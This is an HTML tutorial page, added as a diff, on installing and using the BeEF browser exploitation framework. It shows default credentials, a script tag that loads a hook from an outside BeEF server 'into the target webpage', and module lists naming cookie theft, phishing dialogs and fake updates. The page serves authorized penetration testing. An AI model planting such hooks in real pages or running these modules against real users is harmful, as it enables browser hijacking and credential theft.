@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BeEF Framework Tool</title>
+    <link rel="stylesheet" href="Beef.css">
+</head>
+<body>
+    <header>
+        <h1>Penetration Testing : BeEF Framework</h1>
+    </header>
+    <nav class="navbar">
+        <div class="navbar-container">
+            <a href="#" class="navbar-logo">PenTest Tools</a>
+            <button class="navbar-toggle">☰</button>
+            <ul class="navbar-menu">
+                <li class="navbar-item"><a href="/test.html" class="navbar-link">Cybersecurity</a></li>
+                <li class="navbar-item"><a href="/test.html" class="navbar-link">Penetration Testing</a></li>
+                <li class="navbar-item"><a href="/Navbar/tools.html" class="navbar-link">Tools</a></li>
+                <li class="navbar-item"><a href="/Navbar/about.html" class="navbar-link">About</a></li>
+                <li class="navbar-item"><a href="#contact" class="navbar-link">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+<main>
+    <section id="about">
+        <h2>About BeEF</h2>
+        <p>Browser Exploitation Framework (BeEF) is a penetration testing tool focused on web browsers. It allows security professionals to assess the security posture of web browsers and conduct client-side attacks.</p>
+        
+        <div class="warning-box">
+            <h3>⚠️ Important Notice</h3>
+            <p>BeEF should only be used for authorized security testing. Unauthorized use may be illegal.</p>
+        </div>
+
+        <h3>Key Features</h3>
+        <ul>
+            <li>Browser fingerprinting</li>
+            <li>Social engineering modules</li>
+            <li>Network discovery</li>
+            <li>Exploitation modules</li>
+            <li>Command and control interface</li>
+            <li>Cross-platform compatibility</li>
+            <li>RESTful API</li>
+            <li>Integration with other security tools</li>
+        </ul>
+    </section>
+
+    <section id="installation">
+        <h2>Installation</h2>
+        
+        <h3>On Kali Linux</h3>
+        <div class="code-block">
+            <code>sudo apt update && sudo apt install beef-xss</code>
+        </div>
+
+        <h3>From Source</h3>
+        <div class="code-block">
+            <code>git clone https://github.com/beefproject/beef.git
+cd beef
+./install</code>
+        </div>
+
+        <h3>Dependencies Installation</h3>
+        <div class="code-block">
+            <code>sudo gem install bundler
+bundle install</code>
+        </div>
+    </section>
+
+    <section id="basic-usage">
+        <h2>Basic Usage Guide</h2>
+
+        <h3>1. Starting BeEF</h3>
+        <div class="code-block">
+            <code>cd beef
+./beef</code>
+            <p>Default credentials:</p>
+            <ul>
+                <li>Username: beef</li>
+                <li>Password: beef</li>
+            </ul>
+        </div>
+
+        <h3>2. Accessing the UI</h3>
+        <div class="step-box">
+            <ol>
+                <li>Open browser to <code>http://localhost:3000/ui/panel</code></li>
+                <li>Login with credentials</li>
+                <li>View the control panel</li>
+            </ol>
+        </div>
+
+        <h3>3. Hook Implementation</h3>
+        <div class="code-block">
+            <p>Add this to target webpage:</p>
+            <code>&lt;script src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;</code>
+        </div>
+    </section>
+
+    <section id="modules">
+        <h2>Common Modules</h2>
+        <div class="modules-grid">
+            <div class="module-card">
+                <h3>Reconnaissance</h3>
+                <ul>
+                    <li>Browser fingerprinting</li>
+                    <li>Network discovery</li>
+                    <li>Cookie theft</li>
+                    <li>System information gathering</li>
+                </ul>
+            </div>
+
+            <div class="module-card">
+                <h3>Social Engineering</h3>
+                <ul>
+                    <li>Fake notifications</li>
+                    <li>Phishing dialogs</li>
+                    <li>Clickjacking attacks</li>
+                    <li>Fake updates</li>
+                </ul>
+            </div>
+
+            <div class="module-card">
+                <h3>Network</h3>
+                <ul>
+                    <li>Port scanning</li>
+                    <li>DNS enumeration</li>
+                    <li>Ping sweeping</li>
+                    <li>Internal network mapping</li>
+                </ul>
+            </div>
+
+            <div class="module-card">
+                <h3>Persistence</h3>
+                <ul>
+                    <li>Man-in-the-Browser</li>
+                    <li>IFRAME creation</li>
+                    <li>Pop-under windows</li>
+                    <li>Browser plugins</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <section id="practical-examples">
+        <h2>Practical Examples</h2>
+
+        <h3>1. Basic Hook Setup</h3>
+        <div class="code-block">
+            <code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Test Page&lt;/title&gt;
+    &lt;script src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Test Content&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code>
+        </div>
+
+        <h3>2. Custom Hook with SSL</h3>
+        <div class="code-block">
+            <code>&lt;script src="https://beef-server:3000/hook.js"&gt;&lt;/script&gt;</code>
+        </div>
+
+        <h3>3. API Integration</h3>
+        <div class="code-block">
+            <code>curl -H "Content-Type: application/json" \
+-X POST \
+-d '{"username":"beef", "password":"beef"}' \
+http://localhost:3000/api/admin/login</code>
+        </div>
+    </section>
+
+    <section id="advanced-usage">
+        <h2>Advanced Usage</h2>
+
+        <h3>Custom Module Development</h3>
+        <div class="code-block">
+            <p>Basic module structure:</p>
+            <code>modules/
+└── custom_module/
+    ├── command.js
+    ├── config.yaml
+    └── module.rb</code>
+        </div>
+
+        <h3>Integration with Metasploit</h3>
+        <div class="code-block">
+            <code># In beef config.yaml
+extension:
+    metasploit:
+        enable: true
+        host: "127.0.0.1"
+        port: 55553
+        user: "msf"
+        pass: "abc123"</code>
+        </div>
+    </section>
+
+    <section id="best-practices">
+        <h2>Best Practices</h2>
+        <ul>
+            <li><strong>Security:</strong> Change default credentials immediately</li>
+            <li><strong>Scope:</strong> Define clear testing boundaries</li>
+            <li><strong>Documentation:</strong> Log all testing activities</li>
+            <li><strong>Updates:</strong> Keep BeEF and modules updated</li>
+            <li><strong>Network:</strong> Use secure connections when possible</li>
+            <li><strong>Testing:</strong> Verify modules in isolated environment</li>
+        </ul>
+    </section>
+
+    <section id="troubleshooting">
+        <h2>Troubleshooting</h2>
+        <div class="troubleshooting-grid">
+            <div class="issue-card">
+                <h3>Hook Not Working</h3>
+                <ul>
+                    <li>Verify server is running</li>
+                    <li>Check network connectivity</li>
+                    <li>Verify JavaScript is enabled</li>
+                    <li>Check browser security settings</li>
+                </ul>
+            </div>
+
+            <div class="issue-card">
+                <h3>UI Access Issues</h3>
+                <ul>
+                    <li>Verify credentials</li>
+                    <li>Check server status</li>
+                    <li>Clear browser cache</li>
+                    <li>Check firewall settings</li>
+                </ul>
+            </div>
+
+            <div class="issue-card">
+                <h3>Module Errors</h3>
+                <ul>
+                    <li>Update modules</li>
+                    <li>Check dependencies</li>
+                    <li>Verify browser compatibility</li>
+                    <li>Review error logs</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+</main>
+<footer>
+    <p>&copy; 2024 Cybersecurity and Penetration Testing Resource. All rights reserved.</p>
+    <p>Developed by <a href="#" target="_blank">Your Organization</a></p>
+    <p><a href="#" target="_blank">Privacy Policy</a> | <a href="#" target="_blank">Terms of Service</a></p>
+</footer>
+<script>
+    const navbarToggle = document.querySelector('.navbar-toggle');
+    const navbarMenu = document.querySelector('.navbar-menu');
+
+    navbarToggle.addEventListener('click', () => {
+        navbarMenu.classList.toggle('active');
+    });
+</script>
+</body>
+</html>
